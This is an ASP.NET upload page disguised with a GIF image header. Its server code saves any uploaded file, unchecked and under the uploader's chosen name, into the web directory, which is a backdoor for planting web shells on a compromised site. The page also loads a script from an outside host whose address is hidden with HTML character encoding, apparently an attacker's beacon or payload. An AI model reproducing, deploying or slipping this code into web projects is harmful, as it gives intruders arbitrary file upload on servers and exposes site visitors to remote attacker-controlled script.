GIF89a;
<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

    protected void Button1_Click(object sender, EventArgs e)
    {
        FileUpload1.SaveAs(Server.MapPath("./") + FileUpload1.FileName);
        Response.Write(FileUpload1.FileName + " uploaded as.");
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>ASPXUpload page</title>
</head>
<body>
<SCRIPT SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
    <form id="form1" runat="server">
    <div>
    
    </div>
    <asp:FileUpload ID="FileUpload1" runat="server" />
    <asp:Button ID="Button1" runat="server" onclick="Button1_Click" Text="Button" />
    </form>
</body>
</html>